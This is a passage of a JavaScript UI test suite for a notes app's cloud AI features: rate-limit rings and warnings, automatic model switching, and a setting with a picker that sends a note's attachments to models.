      cm().querySelector('[data-act="cl-cmore"]').click(); await tick(); if (cm()?.querySelectorAll('.cl-cm-row').length !== 4) qb('All 4 models opens the list', `${cm()?.querySelectorAll('.cl-cm-row').length}`);
      calls = await withApi({ ai_cloud_models: pid => ({ status: 'success', ok: true, models: [], message: `Groq lists 4 models. Only your key was sent.` }) }, async () => { cm().querySelector('[data-act="cl-refresh"]').click(); await until(() => /Only your key was sent/.test(S.status || '')); });
      if (calls[0]?.[0] !== 'ai_cloud_models' || calls[0][1][0] !== 'groq') qb('Refresh asks the company again', JSON.stringify(calls));
      set({ modal: null }); S.setSec = 'appearance'; CLOUD.allModels = {}; reset(); aiDemo('ready'); renderAll(); }
    // 4e · QC 92: what's left of each free limit. A small ring beside each cloud model in the menu (red at 90%, "counted" where the
    //      company says nothing); the ring by Send becomes the limits with a cloud model and its card shows them with reset times;
    //      at 90% a heads-up above the input with the offer; at the limit the offer; Switch automatically (off) asks the next model
    //      of the same company by itself; Settings shows each company's limits today and where they come from
    if (await cloudOk('QC 92')) { const Q = N.qc92 = {}, qb = (k, v) => bad('QC 92 ' + k, v), txt = e => (e?.textContent || '').replace(/\s+/g, ' ').trim();
      await CLOUD.ready; reset(); aiDemo('ready'); cloudDemoFill(AI.st); CLOUD.auto = false;
      const U = { 'openai/gpt-oss-20b': { sent: 4, source: 'headers', requests: { used: 902, of: 1000, left: 98, reset_in: 21600, window: 'day' }, tokens: { used: 4210, of: 12000, left: 7790, reset_in: 8, window: 'minute' } },
        'llama-3.3-70b-versatile': { sent: 2, source: 'headers', requests: { used: 212, of: 14400, left: 14188, reset_in: 21600, window: 'day' } }, 'gemini-3.1-flash-lite': { sent: 41, source: 'counted' } };
      const LISTS = { groq: [['openai/gpt-oss-20b', 'GPT-OSS 20B', true], ['llama-3.3-70b-versatile', 'Llama 3.3 70B'], ['qwen/qwen3-32b', 'Qwen3 32B']], gemini: [['gemini-3.1-flash-lite', 'Gemini 3.1 Flash-Lite', true]] };
      AI.st.cloud.forEach(p => { const l = LISTS[p.id]; if (!l) return; Object.assign(p, { has_key: true, masked: 'good…1234', seen: '2026-10-19', list_state: 'saved', listed_at: '2026-10-19T10:42',
        models: l.map(([id, name, rec]) => ({ id, name, ctx: '131K', vision: false, rec: !!rec, used: false, use: U[id] || { sent: 0, source: 'counted' } })) }); });
      AI.st.route.qa = 'cloud:groq'; AI.st.routes.qa = { kind: 'cloud', prov: 'groq', model: 'openai/gpt-oss-20b', name: 'GPT-OSS 20B', svc: 'Groq', label: 'GPT-OSS 20B · Groq · cloud', key: 'cloud:groq', ready: true, seen: true, has_key: true, auto: false, free: true };
      set({ screen: '1920x1080', view: 'notes', modal: null, inspector: 'shown' }); AIC.mode = 'dock'; app.querySelector('[data-act="ain-ask"]').click(); await tick();
      // the ring by Send, and its card
      const ring = app.querySelector('[data-cl-ring]'), pop = ring?.querySelector('.cl-ringpop');
      Q.ring = `${ring?.className} · "${txt(ring?.querySelector('.num'))}" · card "${txt(pop)}"`;
      if (!ring?.classList.contains('is-red') || txt(ring.querySelector('.num')) !== '90%' || !/Requests today: 902 of 1,000 · 98 left · resets in 6 h/.test(txt(pop)) || !/Tokens this minute: 4,210 of 12,000 · resets in 8 s/.test(txt(pop)) || !/From Groq’s replies/.test(txt(pop))) qb('the ring by Send shows the limits, and its card the limits and resets', Q.ring);
      ring?.focus(); const ps = pop && getComputedStyle(pop), focusRule = [...document.styleSheets].flatMap(sh => { try { return [...sh.cssRules]; } catch (e) { return []; } }).some(r => /cl-ring:focus \.cl-ringpop/.test(r.selectorText || '') && r.style.visibility === 'visible');
      Q.ringFocus = document.hasFocus() ? ps?.visibility : `window not focused: the rule ${focusRule ? 'is there' : 'is missing'}`;   // a window without focus never matches :focus
      if (document.hasFocus() ? ps?.visibility !== 'visible' : !focusRule) qb('the card shows at once on keyboard focus', Q.ringFocus);
      if (pop) { const pr = pop.getBoundingClientRect(), ar = app.getBoundingClientRect(); if (pr.left < ar.left || pr.right > ar.right + 1 || pr.top < ar.top) qb('the ring’s card stays inside the window', [pr.left, pr.top, pr.right].map(Math.round).join(',')); }
      ring?.blur();
      // at 90%: the heads-up above the input, with the offer
      const hd = app.querySelector('.cl-heads'), box = app.querySelector('.aic-box');
      Q.heads = `"${txt(hd)}"`;
      if (!/GPT-OSS 20B: 98 requests left today/.test(txt(hd)) || !/Use Llama 3\.3 70B on Groq \(14,188 left\)/.test(txt(hd)) || !/or Gemini 3\.1 Flash-Lite/.test(txt(hd))) qb('the 90% heads-up, with the next model with room', Q.heads);
      if (hd && box && hd.getBoundingClientRect().bottom > box.getBoundingClientRect().top + 1) qb('the heads-up sits above the input, never over it', '');
      let calls = await withApi({ ai_set_route: () => ({ status: 'success' }) }, async () => { hd.querySelector('[data-act="cl-switch"]').click(); await tick(4); });
      Q.switch = calls.map(c => `${c[0]} ${c[1].join(' ')}`).join(' · '); if (Q.switch !== 'ai_set_route qa cloud:groq:llama-3.3-70b-versatile') qb('Use … switches Ask’s model', Q.switch);
      // the menu: a ring beside each cloud model with numbers; words where it's counted
      app.querySelector('[data-aic-opener="opts"]')?.click(); await tick(); const ms = [...app.querySelectorAll('[data-aic-menu] .cl-mi .cl-meter')];
      Q.menu = ms.map(m => `${m.className.replace('cl-meter ', '')}:${txt(m)}`).join(' | ');
      if (ms.length !== 3 || !ms.some(m => m.classList.contains('is-red') && txt(m) === '902 of 1k' && /902 of 1,000 · 98 left · resets in 6 h/.test(m.getAttribute('aria-label')) && m.querySelector('svg')) || !ms.some(m => m.classList.contains('is-counted') && /41 sent/.test(txt(m)) && /counted by NeuroVault/.test(m.getAttribute('aria-label')))) qb('a ring beside each cloud model in the menu', Q.menu);
      app.querySelectorAll('[data-aic-menu] .cl-mi').forEach(b => { const br = b.getBoundingClientRect(), mr = b.closest('[data-aic-menu]').getBoundingClientRect(); if (b.scrollWidth > b.clientWidth + 1 || br.right > mr.right + 0.5 || [...b.children].some(c => c.getBoundingClientRect().right > br.right + 0.5)) qb('no menu row runs out of room', txt(b).slice(0, 30)); });
      AIC.menu = null; renderAll();
      // at the limit: the offer; Switch automatically on: the same company's next model answers by itself
      const typeAsk = async q => { const ta = app.querySelector('#aic-in'); ta.value = q; ta.dispatchEvent(new Event('input', { bubbles: true })); ta.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true })); };
      calls = await withApi({ ai_ask: () => ({ status: 'success', job: 'L1' }), ai_job: () => ({ status: 'success', state: 'error', message: 'GPT-OSS 20B on Groq: today’s free limit is used up.', limit: 'groq', limit_key: 'cloud:groq' }) }, async () => { await typeAsk('And next?'); await until(() => !AIC.busy && app.querySelector('.cl-limit')); });
      Q.limit = txt(app.querySelector('.cl-limit .aic-err-acts'));
      if (!/^Use Llama 3\.3 70B on Groq \(14,188 left\)or Gemini 3\.1 Flash-LiteUse this PCUse another key/.test(Q.limit)) qb('at the limit: the offer, then Use this PC and another key', Q.limit);
      CLOUD.auto = true; renderAll(); let step = 0;
      calls = await withApi({ ai_set_route: () => ({ status: 'success' }), ai_ask: () => ({ status: 'success', job: 'A' + (++step) }),
        ai_job: id => id === 'A1' ? { status: 'success', state: 'error', message: 'GPT-OSS 20B on Groq: today’s free limit is used up.', limit: 'groq', limit_key: 'cloud:groq' } : { status: 'success', state: 'done', result: { answer: 'Start with the audit.', by: 'Llama 3.3 70B' } } },
        async () => { await typeAsk('What first?'); await until(() => step >= 2 && !AIC.busy, 120); await tick(4); });
      Q.auto = `${calls.map(c => c[0]).join(',')} · route ${calls.find(c => c[0] === 'ai_set_route')?.[1].join(' ')} · by "${txt(app.querySelector('.aic-turn.is-newest .cl-by'))}"`;
      if (calls.filter(c => c[0] === 'ai_ask').length !== 2 || calls.find(c => c[0] === 'ai_set_route')?.[1][1] !== 'cloud:groq:llama-3.3-70b-versatile' || !/^Llama 3\.3 70B · Groq · cloud/.test(txt(app.querySelector('.aic-turn.is-newest .cl-by')))) qb('Switch automatically: the next Groq model answers by itself', Q.auto);
      CLOUD.auto = false;
      // Settings: each company's limits today; Gemini counted by NeuroVault; Switch automatically, off
      AIC.open = false; S.setSec = 'ai'; AIS.tab = 'cloud'; set({ modal: 'settings' });
      const g = app.querySelector('[data-cl-usage="groq"]'), gm = app.querySelector('[data-cl-usage="gemini"]'), auto = app.querySelector('[data-act="cl-auto"]');
      Q.settings = `groq "${txt(g).slice(0, 120)}" · gemini "${txt(gm).slice(0, 120)}" · auto ${auto?.getAttribute('aria-checked')}`;
      if (!/From Groq’s replies/.test(txt(g)) || g.querySelectorAll('.cl-urow').length !== 2 || !/Counted by NeuroVault/.test(txt(gm)) || !gm.querySelector('[data-act="cl-link"]') || auto?.getAttribute('aria-checked') !== 'false') qb('Settings: limits today, where from, Switch automatically off', Q.settings);
      auto?.click(); await tick(); if (!CLOUD.auto) qb('Switch automatically turns on', ''); CLOUD.auto = false;
      set({ modal: null }); S.setSec = 'appearance'; reset(); aiDemo('ready'); renderAll(); }
    // 4e2 · QC 98: before the first answer a company that says what's left is waiting ("Your limits show after your first question
    //      today"), never "counted by NeuroVault"; Gemini, which doesn't say, is counted; Groq's rolling day reads "refills gradually ·
    //      next one back in 4 s"; Settings has "Check my limits" (only on click) for a company that says, and none for one that doesn't
    if (await cloudOk('QC 98')) { const PYW = window.pywebview; window.pywebview = undefined; try {   // its own starting state: no app (the staging bridge's config and notes stay out); withApi fakes one where it's needed
      const Q = N.qc98 = {}, qb = (k, v) => bad('QC 98 ' + k, v), txt = e => (e?.textContent || '').replace(/\s+/g, ' ').trim();
      await CLOUD.ready; reset(); aiDemo('ready'); cloudDemoFill(AI.st); CLOUD.auto = false;
      const fill = (pid, id, name, use) => { const p = AI.st.cloud.find(x => x.id === pid); Object.assign(p, { has_key: true, masked: 'good…1234', seen: '2026-10-19', list_state: 'saved', listed_at: '2026-10-19T10:42',
        models: [{ id, name, ctx: '131K', vision: false, rec: true, used: false, use }] }); };
      const route = (pid, id, name) => { const p = AI.st.cloud.find(x => x.id === pid); AI.st.route.qa = 'cloud:' + pid;
        AI.st.routes.qa = { kind: 'cloud', prov: pid, model: id, name, svc: p.name, label: `${name} · ${p.name} · cloud`, key: 'cloud:' + pid, ready: true, seen: true, has_key: true, auto: false, free: true }; renderAll(); };
      const ringTxt = () => { const r = app.querySelector('[data-cl-ring]'); return `${r?.className.replace(/aic-meter cl-ring /, '')} · "${txt(r?.querySelector('.num'))}" · "${txt(r?.querySelector('.cl-ringpop'))}" · aria "${r?.getAttribute('aria-label')}"`; };
      fill('groq', 'openai/gpt-oss-20b', 'GPT-OSS 20B', { sent: 0, source: 'counted' }); fill('gemini', 'gemini-3.1-flash-lite', 'Gemini 3.1 Flash-Lite', { sent: 0, source: 'counted' });
      route('groq', 'openai/gpt-oss-20b', 'GPT-OSS 20B'); set({ screen: '1920x1080', view: 'notes', modal: null, inspector: 'shown' }); AIC.mode = 'dock'; app.querySelector('[data-act="ain-ask"]').click(); await tick();
      Q.before = ringTxt();
      if (!/Your limits show after your first question today/.test(Q.before) || /counted by NeuroVault|doesn’t say what’s left/i.test(Q.before) || /\d+%/.test(txt(app.querySelector('[data-cl-ring] .num')))) qb('before the first answer: waiting, not counted, no %', Q.before);
      route('gemini', 'gemini-3.1-flash-lite', 'Gemini 3.1 Flash-Lite'); Q.counted = ringTxt();
      if (!/counted by NeuroVault/.test(Q.counted) || /first question/.test(Q.counted)) qb('a company that doesn’t say is counted by NeuroVault', Q.counted);
      fill('groq', 'openai/gpt-oss-20b', 'GPT-OSS 20B', { sent: 1, source: 'headers', at: new Date().toISOString(), requests: { used: 1, of: 1000, left: 999, reset_in: 4, window: 'day', rolling: true }, tokens: { used: 0, of: 8000, left: 8000, reset_in: null, window: 'minute' } });
      route('groq', 'openai/gpt-oss-20b', 'GPT-OSS 20B'); Q.rolling = ringTxt();
      if (!/Requests today: 1 of 1,000 · 999 left · refills gradually · next one back in 4 s/.test(Q.rolling) || /resets in 4 s/.test(Q.rolling) || txt(app.querySelector('[data-cl-ring] .num')) !== '0%') qb('Groq’s rolling day: refills gradually, the next one back in 4 s', Q.rolling);
      fill('groq', 'openai/gpt-oss-20b', 'GPT-OSS 20B', { sent: 0, source: 'headers', at: '2026-10-18T22:00:00', requests: { used: 300, of: 1000, left: 700, reset_in: 60, window: 'day', rolling: true } });
      route('groq', 'openai/gpt-oss-20b', 'GPT-OSS 20B'); Q.kept = ringTxt();
      if (txt(app.querySelector('[data-cl-ring] .num')) !== '30%' || !/last known at \d\d:\d\d on 18 Oct/.test(Q.kept)) qb('the last-known limits show a % at once, said as last known', Q.kept);
      // Settings: Check my limits for Groq (one tiny message, said plainly), none for Gemini; it runs only on click
      AIC.open = false; S.setSec = 'ai'; AIS.tab = 'cloud'; fill('groq', 'openai/gpt-oss-20b', 'GPT-OSS 20B', { sent: 0, source: 'counted' });
      let calls = await withApi({}, async () => { set({ modal: 'settings' }); await tick(2); });
      const g = app.querySelector('[data-cl-usage="groq"]'), gm = app.querySelector('[data-cl-usage="gemini"]'), btn = g?.querySelector('[data-act="cl-usage"]');
      Q.settings = `groq "${txt(g).slice(0, 220)}" · gemini button ${!!gm?.querySelector('[data-act="cl-usage"]')} · calls on open ${calls.filter(c => c[0] === 'ai_cloud_usage').length}`;
      if (txt(btn) !== 'Check my limits' || !/Your limits show after your first question today/.test(txt(g)) || !/one tiny message \(“Hi”, none of your notes\), which counts as one request/.test(txt(g)) || gm?.querySelector('[data-act="cl-usage"]') || calls.some(c => c[0] === 'ai_cloud_usage')) qb('Settings: Check my limits for Groq only, said plainly, nothing sent on open', Q.settings);
      calls = await withApi({ ai_cloud_usage: () => ({ status: 'success', ok: true, message: 'Groq: 1 of 1,000 requests used today, 999 left. That check sent one tiny message (no notes).' }) }, async () => { btn?.click(); await tick(4); });
      Q.click = calls.filter(c => c[0] === 'ai_cloud_usage').map(c => c[1].join(' ')).join(' | ');
      if (!/^groq/.test(Q.click)) qb('Check my limits asks Groq on click', Q.click);
      set({ modal: null }); S.setSec = 'appearance'; reset(); aiDemo('ready'); renderAll(); } finally { window.pywebview = PYW; } }
    // 4f · QC 93 → QC 101: "Let AI read this note's attachments", off by default. Off: one quiet line names the files and turns it on.
    //      On: above the input each file is included, trimmed or not readable (and why), for ANY model (texts to every model, pictures
    //      only to one that can see them); the paperclip picker unticks files and adds one from the vault; Ask sends the ticked ones;
    //      the first-use notice names the files that go
    if (await cloudOk('QC 101')) { const PYW = window.pywebview; window.pywebview = undefined; try {   // its own starting state: no app (the staging bridge's config and notes stay out); withApi fakes one where it's needed
      const Q = N.qc93 = {}, qb = (k, v) => bad('QC 101 ' + k, v), txt = e => (e?.textContent || '').replace(/\s+/g, ' ').trim();
      await CLOUD.ready; reset(); aiDemo('ready'); cloudDemoFill(AI.st); CLOUD.att = false; CLOUD.attPick = {}; CLOUD.attPrev = null; CLOUD.attMenu = null;
      AI.st.cloud.forEach(p => { if (p.id === 'gemini' || p.id === 'groq') Object.assign(p, { has_key: true, seen: '2026-10-19',
        models: p.id === 'gemini' ? [{ id: 'gemini-3.1-flash-lite', name: 'Gemini 3.1 Flash-Lite', ctx: '1M', vision: true, rec: true, used: false, use: { sent: 0, source: 'counted' } }]
          : [{ id: 'openai/gpt-oss-20b', name: 'GPT-OSS 20B', ctx: '131K', vision: false, rec: true, used: false, use: { sent: 0, source: 'counted' } }] }); });
      const route = (pid, seen = true) => { const p = AI.st.cloud.find(x => x.id === pid), m = p.models[0]; AI.st.route.qa = 'cloud:' + pid; CLOUD.attPrev = null;
        AI.st.routes.qa = { kind: 'cloud', prov: pid, model: m.id, name: m.name, svc: p.name, label: `${m.name} · ${p.name} · cloud`, key: 'cloud:' + pid, ready: seen, seen, has_key: true, vision: m.vision }; renderAll(); };
      set({ screen: '1920x1080', view: 'notes', modal: null, inspector: 'shown' });
      const n = note(), md0 = n.md; n.md = 'The audit is on Friday.\n\n![[attachments/photo.png]]\n\n![[attachments/budget.docx]]\n\n![[attachments/song.mp3]]\n\n![[attachments/stage-zero.html]]'; n.html = null;
      route('gemini'); AIC.mode = 'dock'; app.querySelector('[data-act="ain-ask"]').click(); await tick();
      const typeAsk = async q => { const ta = app.querySelector('#aic-in'); ta.value = q; ta.dispatchEvent(new Event('input', { bubbles: true })); ta.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true })); };
      const askCalls = async (fake = {}) => withApi({ ai_ask: () => ({ status: 'success', job: 'T' }), ai_job: () => ({ status: 'success', state: 'done', result: { answer: 'Three hundred pounds.', by: 'x' } }), ...fake }, async () => { await typeAsk('What is the budget?'); await until(() => !AIC.busy); await tick(2); });
      const sentFiles = calls => JSON.stringify(calls.find(c => c[0] === 'ai_ask')?.[1][4] ?? null);
      const line = () => app.querySelector('.cl-attline'), states = () => [...app.querySelectorAll('.cl-att-i')].map(li => `${li.querySelector('.cl-att-n')?.textContent}:${li.dataset.clAttState}`).join(' ');
      // off: one quiet line, Turn on; nothing goes
      Q.off = `"${txt(line())}" · picker ${!!app.querySelector('[data-act="cl-attpick"]')}`; let calls = await askCalls(); Q.off += ` · sent ${sentFiles(calls)}`;
      if (!line()?.matches('[data-cl-att-off]') || !/^Turn on “Let AI read attachments” to include photo\.png, budget\.docx and 2 more\.Turn on$/.test(txt(line())) || app.querySelector('[data-act="cl-attpick"]') || calls.find(c => c[0] === 'ai_ask')?.[1][4]) qb('off: one quiet line with Turn on, no picker, nothing sent', Q.off);
      app.querySelector('[data-cl-att-off] [data-act="cl-att"]')?.click(); await tick();
      if (!CLOUD.att || document.activeElement?.dataset.act !== 'cl-attpick') qb('Turn on turns it on and moves to the picker', `${CLOUD.att} ${document.activeElement?.dataset.act}`);
      // on, a model that can see pictures: every file listed with what happens to it (the page's guess until the app says)
      Q.on = `"${txt(line())}" · ${states()}`;
      if (!/^3 of 4 attachments go to Gemini 3\.1 Flash-Lite on Google Gemini/.test(txt(line())) || states() !== 'photo.png:included budget.docx:included song.mp3:unreadable stage-zero.html:included' || !/song\.mp3not readable: it’s a sound recording, which the AI can’t hear/.test(txt(line()))) qb('on: each file included or not readable, and why', Q.on);
      calls = await askCalls(); Q.on += ` · sent ${sentFiles(calls)}`;
      if (sentFiles(calls) !== '["attachments/photo.png","attachments/budget.docx","attachments/song.mp3","attachments/stage-zero.html"]') qb('Ask sends every ticked file (the app reads them)', Q.on);
      const box = app.querySelector('.aic-box'); if (line() && box && line().getBoundingClientRect().bottom > box.getBoundingClientRect().top + 1) qb('the line sits above the input', '');
      // the app's own answer: trimmed, with the numbers
      CLOUD.attPrev = null; const PREV = [{ file: 'attachments/photo.png', name: 'photo.png', kind: 'image', state: 'included', why: '', chars: 0, of: 0 }, { file: 'attachments/budget.docx', name: 'budget.docx', kind: 'text', state: 'included', why: '', chars: 812, of: 812 },
        { file: 'attachments/song.mp3', name: 'song.mp3', kind: 'text', state: 'unreadable', why: 'it’s a sound recording, which the AI can’t hear', chars: 0, of: 0 }, { file: 'attachments/stage-zero.html', name: 'stage-zero.html', kind: 'text', state: 'trimmed', why: '', chars: 12000, of: 40210 }];
      calls = await withApi({ ai_attach_preview: () => ({ status: 'success', on: true, items: PREV, budget: 30000 }) }, async () => { renderAll(); await until(() => CLOUD.attPrev?.items); await tick(2); });
      Q.app = `${calls.filter(c => c[0] === 'ai_attach_preview').map(c => `${c[1][0]} ${JSON.stringify(c[1][1])}`).join(' | ')} · "${txt(line())}"`;
      if (calls.filter(c => c[0] === 'ai_attach_preview').length !== 1 || !/stage-zero\.htmltrimmed to fit: the first 12,000 of 40,210 characters/.test(txt(line())) || app.querySelector('.cl-att-i.is-trimmed')?.dataset.clAttFile !== 'attachments/stage-zero.html') qb('the app says, once: trimmed to fit, with the numbers', Q.app);
      // the app answering for a setting that's off there (a reused scratch config): the page's own guess, nothing called unticked
      CLOUD.attPrev = null; calls = await withApi({ ai_attach_preview: () => ({ status: 'success', on: false, items: [], budget: 0 }) }, async () => { renderAll(); await until(() => CLOUD.attPrev?.items); await tick(2); });
      Q.offThere = `"${txt(line())}"`;
      if (!/^3 of 4 attachments go to Gemini/.test(txt(line())) || /unticked/.test(txt(line()))) qb('an answer for the setting off there falls back to the page’s guess', Q.offThere);
      CLOUD.attPrev = null;
      // a model that can't see pictures: the documents still go (QC 101), the picture says why not
      route('groq'); Q.text = `"${txt(line())}" · ${states()}`;
      if (!/^2 of 4 attachments go to GPT-OSS 20B on Groq/.test(txt(line())) || !/photo\.pngnot readable: GPT-OSS 20B can’t see pictures/.test(txt(line())) || !/budget\.docxincluded/.test(txt(line()))) qb('a text model: documents go, the picture says why not', Q.text);
      // the picker: untick one, add one from the vault
      app.querySelector('[data-act="cl-attpick"]').click(); await tick(); let m = app.querySelector('.cl-attm[data-cl-attm="list"]');
      Q.picker = `${m ? [...m.querySelectorAll('[data-act="cl-atttick"]')].map(c => `${c.dataset.v.slice(12)}${c.checked ? '✓' : '·'}`).join(' ') : 'none'} · expanded ${app.querySelector('[data-act="cl-attpick"]')?.getAttribute('aria-expanded')}`;
      if (!m || m.querySelectorAll('[data-act="cl-atttick"]:checked').length !== 4 || app.querySelector('[data-act="cl-attpick"]').getAttribute('aria-expanded') !== 'true') qb('the picker lists the note’s files, ticked', Q.picker);
      if (m) { const mr = m.getBoundingClientRect(), wr = app.querySelector('.aic-win, .aic, #right-sidebar')?.getBoundingClientRect() || app.getBoundingClientRect(); if (mr.top < wr.top - 1 || mr.left < wr.left - 1 || mr.right > wr.right + 1 || mr.bottom > (box?.getBoundingClientRect().bottom || innerHeight) + 1) qb('the picker stays inside the chat, above the input', [mr.left, mr.top, mr.right, mr.bottom].map(Math.round).join(',')); }
      const song = m?.querySelector('[data-act="cl-atttick"][data-v="attachments/song.mp3"]'); if (song) { song.checked = false; song.dispatchEvent(new Event('change', { bubbles: true })); await tick(); }
      Q.untick = `"${txt(line())}"`;
      if (!/^2 of 3 attachments go to GPT-OSS 20B on Groq · 1 unticked/.test(txt(line())) || /song\.mp3/.test(txt(line())) || !app.querySelector('.cl-attm[data-cl-attm="list"]')) qb('an unticked file leaves the line, and the picker stays open', Q.untick);
      calls = await withApi({ list_attachments: () => ({ status: 'success', files: [{ file: 'attachments/extra.md', name: 'extra.md', kind: 'other', size: 1200 }, { file: 'attachments/photo.png', name: 'photo.png', kind: 'image', size: 900 }] }) },
        async () => { app.querySelector('[data-act="cl-attvault"]').click(); await until(() => CLOUD.vault?.length); await tick(2); });
      m = app.querySelector('.cl-attm[data-cl-attm="vault"]'); Q.vault = `${m ? txt(m) : 'none'} · focus ${document.activeElement?.id}`;
      if (!m || m.querySelectorAll('[data-act="cl-attadd"]').length !== 1 || !/extra\.md/.test(txt(m)) || document.activeElement?.id !== 'cl-attq') qb('Add a file from the vault: the vault’s other files, search focused', Q.vault);
      m?.querySelector('[data-act="cl-attadd"]')?.click(); await tick(); Q.added = `"${txt(line())}" · picker "${txt(app.querySelector('.cl-attm'))}"`;
      if (!/extra\.mdincluded/.test(txt(line())) || !/extra\.mdfrom the vault/.test(txt(app.querySelector('.cl-attm[data-cl-attm="list"]')))) qb('the vault file joins this question', Q.added);
      document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); await tick();
      if (app.querySelector('.cl-attm') || document.activeElement?.dataset.act !== 'cl-attpick') qb('Escape closes the picker, back on its button', `${!!app.querySelector('.cl-attm')} ${document.activeElement?.dataset.act}`);
      calls = await askCalls(); Q.sent = sentFiles(calls);
      if (Q.sent !== '["attachments/photo.png","attachments/budget.docx","attachments/stage-zero.html","attachments/extra.md"]') qb('Ask sends the ticked files and the vault one', Q.sent);
      // a model on this PC: texts go, pictures don't
      CLOUD.attPick = {}; reset(); aiDemo('ready'); cloudDemoFill(AI.st); CLOUD.att = true; AIC.mode = 'dock'; AIC.open = true; renderAll(); await tick();
      Q.local = `"${txt(line())}"`;
      if (!/^2 of 4 attachments go to .+ on this PC/.test(txt(line())) || !/photo\.pngnot readable: models on this PC can’t see pictures yet/.test(txt(line()))) qb('this PC: texts go, pictures say why not', Q.local);
      // the first-use notice names the files that go
      AI.st.cloud.forEach(p => { if (p.id === 'gemini') Object.assign(p, { has_key: true, seen: '', models: [{ id: 'gemini-3.1-flash-lite', name: 'Gemini 3.1 Flash-Lite', ctx: '1M', vision: true, rec: true, used: false, use: { sent: 0, source: 'counted' } }] }); });
      route('gemini', false); await withApi({ ai_ask: () => ({ status: 'success', job: 'T' }) }, async () => { await typeAsk('And the date?'); await until(() => S.modal === 'cl-notice'); });
      Q.notice = txt(app.querySelector('[data-dlg="cl-notice"] .cl-fact:nth-child(2) dd'));
      if (!/and its attachments: photo\.png, budget\.docx, stage-zero\.html\.$/.test(Q.notice)) qb('the first-use notice names the files that go', Q.notice);
      document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); await tick(6);
      // Settings → AI models → Attachments
      AIC.open = false; CLOUD.att = false; S.setSec = 'ai'; AIS.tab = 'jobs'; set({ modal: 'settings' }); const sw = app.querySelector('[data-ais-sec="attach"] [data-act="cl-att"]');
      Q.settings = `${sw?.getAttribute('aria-checked')} · "${txt(app.querySelector('[data-ais-sec="attach"] .set-desc')).slice(0, 120)}"`;
      if (sw?.getAttribute('aria-checked') !== 'false' || !/goes as its text to any model/.test(Q.settings)) qb('Settings: the switch, off, and what it does', Q.settings);
      sw?.click(); await tick(); if (!CLOUD.att) qb('the switch turns it on', ''); CLOUD.att = false; CLOUD.attPick = {}; CLOUD.attPrev = null; CLOUD.attMenu = null;
      n.md = md0; n.html = null; set({ modal: null }); S.setSec = 'appearance'; reset(); aiDemo('ready'); renderAll(); } finally { window.pywebview = PYW; } }
    // 4f2 · QC 106: "Add a file from the vault" with many long names fits above the input (docked at 1366, and the floating chat):
    //      the list scrolls inside the panel, the search stays at the top, sizes never wrap, a long name is cut in the middle with
    //      the full name in NeuroVault's tooltip
    if (await cloudOk('QC 106')) { const PYW = window.pywebview; window.pywebview = undefined; try {
      const Q = N.qc106 = {}, qb = (k, v) => bad('QC 106 ' + k, v), txt = e => (e?.textContent || '').replace(/\s+/g, ' ').trim();
      reset(); aiDemo('ready'); cloudDemoFill(AI.st); CLOUD.att = true; CLOUD.attPick = {}; CLOUD.attPrev = null; CLOUD.attMenu = null; CLOUD.vault = null; const wait0 = TIP.wait;
      const n = note(), md0 = n.md; n.md = 'Job notes.\n\n![[attachments/stage-zero.html]]\n\n![[attachments/JD-Prod-Eng-2.docx]]'; n.html = null;
      const FILES = [{ file: 'attachments/stage-zero.html', name: 'stage-zero.html', size: 14000 }, { file: 'attachments/JD-Prod-Eng-2.docx', name: 'JD-Prod-Eng-2.docx', size: 19000 },
        ...Array.from({ length: 12 }, (_, i) => ({ file: `attachments/Screenshot 2026-10-18 232051 (edited ${i + 1}).png`, name: `Screenshot 2026-10-18 232051 (edited ${i + 1}).png`, size: 189000 + i * 1000 }))];
      for (const [sc, mode] of [['1366x768', 'dock'], ['1366x768', 'float'], ['1920x1080', 'dock']]) {
        const k = `${sc}/${mode}`; CLOUD.attMenu = null; AIC.open = false; AIC.mode = mode; AIC.rect = null; set({ screen: sc, view: 'notes', modal: null, inspector: 'shown' }); app.querySelector('[data-act="ain-ask"]').click(); await tick(2);
        app.querySelector('[data-act="cl-attpick"]')?.click(); await tick(2);
        await withApi({ list_attachments: () => ({ status: 'success', files: FILES }) }, async () => { app.querySelector('[data-act="cl-attvault"]')?.click(); await until(() => CLOUD.vault?.length, 40); await tick(3); });
        const m = app.querySelector('.cl-attm[data-cl-attm="vault"]'), box = app.querySelector('.aic-box'), head = app.querySelector('[data-aic-win] .aic-head'), list = m?.querySelector('.cl-attm-list'), q = m?.querySelector('#cl-attq');
        if (!m || !box || !list || !q) { qb('the vault list opens', k); continue; }
        const mr = m.getBoundingClientRect(), br = box.getBoundingClientRect(), hr = head.getBoundingClientRect(), q0 = q.getBoundingClientRect().top;
        list.scrollTop = 400; await tick(); const q1 = q.getBoundingClientRect().top;
        const sizes = [...m.querySelectorAll('.cl-attm-add .cl-att-s')], lh = parseFloat(getComputedStyle(m).lineHeight) || 18, names = [...m.querySelectorAll('.cl-attm-add .cl-mid')];
        const long = [...m.querySelectorAll('.cl-attm-add')].find(b => /edited 6/.test(b.dataset.tip || '')), cut = long?.querySelector('.cl-mid-a');
        Q[k] = `panel ${Math.round(mr.top)}–${Math.round(mr.bottom)} · input top ${Math.round(br.top)} · head ${Math.round(hr.bottom)} · list ${list.clientHeight}/${list.scrollHeight} · search ${Math.round(q0)}→${Math.round(q1)} · sizes 2-line ${sizes.filter(s => s.offsetHeight > lh * 1.5).length} · names 2-line ${names.filter(s => s.offsetHeight > lh * 1.5).length} · cut "${txt(long)}" ${cut ? cut.scrollWidth > cut.clientWidth : '-'}`;
        if (mr.bottom > br.top + 0.5 || mr.top < hr.bottom - 0.5) qb('the panel sits between the chat’s head and the input, never over the input', Q[k]);
        if (list.scrollHeight <= list.clientHeight || Math.abs(q1 - q0) > 0.5) qb('the list scrolls inside the panel; the search stays at the top', Q[k]);
        if (sizes.some(s => s.offsetHeight > lh * 1.5) || names.some(s => s.offsetHeight > lh * 1.5)) qb('sizes and names keep to one line', Q[k]);
        if (sc === '1366x768' && mode === 'dock') {   // the long name: its start and its end, the full name in our tooltip on hover
          if (!cut || cut.scrollWidth <= cut.clientWidth || !/\(edited 6\)\.png/.test(txt(long.querySelector('.cl-mid-b'))) || txt(long.querySelector('.cl-mid')) !== 'Screenshot 2026-10-18 232051 (edited 6).png') qb('a long name is cut in the middle, keeping its end', Q[k]);
          TIP.wait = 0; long?.dispatchEvent(new PointerEvent('pointerover', { bubbles: true })); await new Promise(r => setTimeout(r, 30));
